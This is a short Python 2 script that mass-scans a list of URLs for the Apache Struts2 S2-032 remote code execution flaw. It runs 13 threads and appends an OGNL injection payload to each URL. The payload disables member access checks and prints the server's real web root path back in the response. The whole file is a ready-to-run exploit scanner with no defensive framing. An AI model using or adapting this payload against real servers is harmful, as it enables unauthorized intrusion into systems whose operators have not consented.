#!/usr/bin/env python
# encoding:utf8
import requests
from threading import Thread
import Queue
import sys

def banner():
    print """
        +--------------------------------------------------------->>>
        +                                                           +
        +                   S2-032 Remote Code Excution             +
        +                   target -> http://xxx.com/xx.action      +
        +                                              by whois     +
        +                                              2016/4/27    +
        +--------------------------------------------------------->>>
    """

def scan():

    headers = {'User-Agent':'Mozilla/5.0 (X11; Linux x86_64; rv: 19.0) Gecko/10100101 Firefox/19.0'}

    payload = "?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23path%3d%23req.getRealPath(%23parameters.pp[0]),%23w%3d%23res.getWriter(),%23w.print(%23path),1?%23xx:%23request.toString&pp=%2f&encoding=UTF-8"

    

    while not url_queue.empty():
        url = url_queue.get()
        try:
            r = requests.get(url+payload, headers=headers)
           
            if r.status_code == 200 and len(r.content) < 100:
                print "[+] Found Vul {0}".format(url)
                print "---> {0}".format(r.content)
            else:
                pass
        except Exception as e:
            pass

def main():

    if len(sys.argv) != 2:
        banner()
        print "[-] python {0} url_file".format(sys.argv[0])
        exit(1)

    banner()

    global url_queue
    url_queue = Queue.Queue()
    with open(sys.argv[1], 'r') as f:
        for line in f.readlines():
            url_queue.put(line.rstrip())

    for t in range(13):
        Thread(target=scan, ).start()


if __name__ == '__main__':
    main()
